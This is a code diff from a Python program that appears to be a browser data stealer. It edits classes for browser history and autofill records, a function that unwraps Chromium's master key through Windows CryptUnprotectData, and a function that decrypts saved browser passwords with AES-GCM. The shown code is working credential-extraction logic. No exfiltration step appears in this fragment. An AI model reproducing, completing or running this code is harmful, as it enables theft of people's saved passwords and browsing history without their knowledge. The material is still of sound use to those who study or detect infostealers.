@@ -69,12 +69,12 @@ class Types:
             self.title = title
             self.visited_time = visited_time
 
-        def time(date):
-            try: return str(datetime(1601, 1, 1) + timedelta(microseconds=date))
+        def time(self):
+            try: return str(datetime(1601, 1, 1) + timedelta(microseconds=self.visited_time))
             except: return "Can't decode"
 
         def __str__(self):
-            return f"URL: {self.url}\nTitle: {self.title}\nVisit Time: {self.time(self.visited_time)}"
+            return f"URL: {self.url}\nTitle: {self.title}\nVisit Time: {self.time()}"
         
     class Autofill:
         def __init__(self, name, value):
@@ -110,19 +110,16 @@ def get_master_key(path: str):
     try:
         master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
         return master_key
-    except Exception: return None
+    except Exception as e: Log(f"{path} Local State ---> {e}")
         
 
-def decrypt_password(buff: bytes, master_key: bytes) -> str:
-    try:
-        iv = buff[3:15]
-        payload = buff[15:]
-        cipher = AES.new(master_key, AES.MODE_GCM, iv)
-        decrypted_pass = cipher.decrypt(payload)
-        decrypted_pass = decrypted_pass[:-16].decode()  
-        return decrypted_pass
-    except: return "FAILED_TO_GET_MASTER_KEY"
-
+def decrypt_password(buff: bytes, master_key: bytes):
+    iv = buff[3:15]
+    payload = buff[15:]
+    cipher = AES.new(master_key, AES.MODE_GCM, iv)
+    decrypted_pass = cipher.decrypt(payload)
+    decrypted_pass = decrypted_pass[:-16].decode()  
+    return decrypted_pass
 
 
 
